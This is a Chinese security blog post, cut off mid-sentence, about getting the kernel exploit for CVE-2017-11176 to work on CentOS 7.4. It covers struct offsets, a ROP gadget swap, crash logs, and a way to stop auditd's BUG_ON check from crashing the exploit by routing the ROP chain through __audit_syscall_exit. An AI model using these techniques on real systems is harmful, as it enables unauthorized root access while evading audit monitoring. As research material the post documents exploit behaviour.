---
title: kernel pwn绕过auditd审计系统
url: https://www.freebuf.com/articles/system/408290.html
source: FreeBuf网络安全行业门户
date: 2024-08-17
fetch_date: 2025-10-06T18:05:42.759179
---

# kernel pwn绕过auditd审计系统

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

kernel pwn绕过auditd审计系统

* ![]()
* 关注

* [系统安全](https://www.freebuf.com/articles/system)

kernel pwn绕过auditd审计系统

2024-08-16 14:27:33

![](https://image.3001.net/images/20240308/1709876354_65eaa4828e91d155430d9.png)
本文由
创作，已纳入「FreeBuf原创奖励计划」，未授权禁止转载

最近看着[bsauce](https://blog.csdn.net/panhewu9919)的博客学习kernel pwn，想试着把CVE-2017-11176复现一下，于是下载了centos 7.4.1708的内核，linux 3.10.0-693.el7.x86\_64.

主要是在[becauce的代码](https://github.com/bsauce/kernel-exploit-factory/blob/main/CVE-2017-11176/exp-slab-4119.c)的基础上修改了下位移：

```
(1)netlink_sock->portid            $ p/x &(*(struct netlink_sock *)0)->portid
    gdb-peda$ print sizeof(struct sock)
    $4 = 0x300
(2)netlink_sock->groups         0x300 + 0x18
(3)netlink_sock->wait->task_list.next
(4)netlink_sock->wait->task_list.prev
```

改完偏移后前面堆喷也很顺利，然后rop的时候因为没有xchg eax, esp; ret; 的gadget，所以修改为0xffffffff81075f57: mov esp, eax; ret;，别的也跟着修改。

在centos 7.4上复现一下，结果没有成功，查了原因，需要关闭smap和kaslr保护，于是使用qemu脚本测试成功了，但是在vmware虚拟机里用iso装系统的时候不成功，内核会崩溃，看了下日志，发现了kernel crash的栈是这样的：

```
[   34.351195] CPU: 0 PID: 2642 Comm: exp-centos-3100 Not tainted 3.10.0-693.el7.x86_64 #1
[   34.351199] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   34.351204] task: ffff88005a4abf40 ti: ffff8800657c4000 task.ti: ffff8800657c4000
[   34.351208] RIP: 0010:[<ffffffff8111f3cf>]  [<ffffffff8111f3cf>] __audit_syscall_entry+0xff/0x110
[   34.351222] RSP: 0018:ffff8800657c7f68  EFLAGS: 00010202
[   34.351226] RAX: 000000000000005a RBX: ffff880067b7fc00 RCX: 00000000000000d0
[   34.351230] RDX: 00000000000009ed RSI: 00000000004b2008 RDI: 000000000000005a
[   34.351233] RBP: ffff8800657c7f78 R08: 00007ffe3fb87d74 R09: ffff88005a4abf40
[   34.351236] R10: 00007ffe3fb87d74 R11: 0000000000000246 R12: 0000000000000001
[   34.351240] R13: 00007ffe3fb87450 R14: 0000000000000000 R15: 0000000000000001
[   34.351245] FS:  00000000005f93c0(0063) GS:ffff88017fc00000(0000) knlGS:0000000000000000
[   34.351249] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   34.351253] CR2: 0000563af42e44a0 CR3: 000000005a45c000 CR4: 00000000000006f0
[   34.351272] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   34.351290] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[   34.351292] Stack:
[   34.351295]  0000000000000001 ffff8801593b2338 00007ffe3fb87d60 ffffffff816B50a3
[   34.351303]  0000000000000246 00007ffe3fb87d74 ffffffff810b79a0 0000000000019c20
[   34.351309]  000000000000005a ffffffffffffffff 00000000000000d0 00000000000009ed
[   34.351317] Call Trace:
[   34.351328]  [<ffffffff816B50a3>] auditsys+0x14/0x45
[   34.351337]  [<ffffffff810b79a0>] ? prepare_kernel_cred+0x20/0x120
[   34.351340] Code: 5d c3 66 2e 0f 1f 84 00 00 00 00 00 48 c7 43 50 00 00 00 00 48 c7 c2 40 fc a3 81 48 89 de 4c 89 cf e8 b6 f4 ff ff 41 89 c4 eb 9a <0f> 0b 0f 1f 44 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00
[   34.351415] RIP  [<ffffffff8111f3cf>] __audit_syscall_entry+0xff/0x110
[   34.351421]  RSP <ffff8800657c7f68>
```

之后使用strace测速系统调用的时候也崩溃了，栈是这样的：

```
[   28.702169] CPU: 0 PID: 2647 Comm: exp-centos-3100 Not tainted 3.10.0-693.el7.x86_64 #1
[   28.702174] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   28.702203] task: ffff880060e28000 ti: ffff88007299c000 task.ti: ffff88007299c000
[   28.702209] RIP: 0010:[<ffffffff8111f3cf>]  [<ffffffff8111f3cf>] __audit_syscall_entry+0xff/0x110
[   28.702306] RSP: 0018:ffff88007299ff08  EFLAGS: 00010202
[   28.702312] RAX: ffff880060e28000 RBX: ffff88015bcb7400 RCX: 00000000000000d0
[   28.702353] RDX: 00000000000009ed RSI: 00000000004b2008 RDI: 000000000000005a
[   28.702360] RBP: ffff88007299ff18 R08: 00007ffe6a4c5f54 R09: ffff880060e28000
[   28.702365] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000001
[   28.702369] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000001
[   28.702377] FS:  00000000008573c0(0063) GS:ffff88017fc00000(0000) knlGS:0000000000000000
[   28.702383] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   28.702389] CR2: 00007f1a4a0e6000 CR3: 000000006888c000 CR4: 00000000000006f0
[   28.702425] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   28.702448] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
[   28.702452] Stack:
[   28.702456]  ffff88007299ff58 000000000000005a ffff88007299ff48 ffffffff81039033
[   28.702467]  0000000000000001 ffff88006882f338 00007ffe6a4c5630 0000000000000000
[   28.702477]  00007ffe6a4c5f40 ffffffff816b5173 0000000000000001 0000000000000000
[   28.702487] Call Trace:
[   28.702528]  [<ffffffff81039033>] syscall_trace_enter+0x173/0x220
[   28.702583]  [<ffffffff816b5173>] tracesys+0x7e/0xe2
[   28.702614]  [<ffffffff810b79a0>] ? prepare_kernel_cred+0x20/0x120
[   28.702620] Code: 5d c3 66 2e 0f 1f 84 00 00 00 00 00 48 c7 43 50 00 00 00 00 48 c7 c2 40 fc a3 81 48 89 de 4c 89 cf e8 b6 f4 ff ff 41 89 c4 eb 9a <0f> 0b 0f 1f 44 00 00 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00
[   28.702729] RIP  [<ffffffff8111f3cf>] __audit_syscall_entry+0xff/0x110
[   28.702739]  RSP <ffff88007299ff08>
```

发现他们共同在同一个指令里面crash了\_\_audit\_syscall\_entry+0xff，于是按照[这个文章](https://sunichi.github.io/2019/02/13/Debug-Linux-Kernel-With-QEMU-KVM/)的方法开了KVM然后设置两线程调试在，用gdb在里面下了断点，对照源码发现是如下问题，在kernel/auditsc.c:1517行：

> void \_\_audit\_syscall\_entry(int major, unsigned long a1, unsigned long a2,
> unsigned long a3, unsigned long a4)
> {
> struct task\_struct \*tsk = current;
> struct audit\_context \*context = tsk->audit\_context;
> enum audit\_state     state;
>
> if (!context)
> return;
>
> BUG\_ON(context->in\_syscall || context->name\_count);  这行！
>
> if (!audit\_enabled)
> return;
>
> context->arch       = syscall\_get\_arch();
> context->major      = major;
> context->argv[0]    = a1;
> context->argv[1]    = a2;
> context->argv[2]    = a3;
> context->argv[3]    = a4;

注意到里面那行有个BUG\_ON，去查了一下，这个auditd是linux里面的审计系统模块，默认centos是装的，可以用systemctl status auditd查看是否开启：

![1723200318_66b5f33e49df570337385.png!small](https://image.3001.net/images/20240809/1723200318_66b5f33e49df570337385.png!small)主要功能是对每个程序的系统调用进行审计。我们知道，程序如果要使用一些高权限的功能如网络，chmod等需要用到系统调用，再由系统代为执行，而通过分析系统程序的系统调用可以知道程序的安全性。

![](https://image.3001.net/images/20240809/1723198409_66b5ebc95194cc312f194.png!small)

于是我关闭审计系统后再次尝试poc就能成功，但是有没有什么办法可以绕过这个系统的呢？经过审计，我发现这个产生BUG的原因是我们通过系统调用进行提权，那么我们这个线程里面的context->in\_syscall就会设置为1，正常的系统调用返回的时候都会调用\_\_audit\_syscall\_exit函数，然后让这个context->in\_syscall设置为0，如下所示：

```
void __audit_syscall_exit(int success, long return_code)
{
        struct task_struct *tsk = current;
        struct audit_context *context;

        if (success)
                success = AUDITSC_SUCCESS;
        else
                success = AUDITSC_FAILURE;

        context = audit_get_context(tsk, success, return_code);
        if (!context)
                return;

        if (context->in_syscall && context->current_state == AUDIT_RECORD_CONTEXT)
                audit_log_exit(context, tsk);

        context->in_syscall = 0; 这行！
        context->prio = context->state == AUDIT_RECORD_CONTEXT ? ~0ULL : 0;
```

而我们提权的时候没有正常返回，所以没有设置为0 ，因此，解决方法是在rop链里面增加这一条返回地址，即可绕过系统。centos里面是这个,查找方法是使用rop...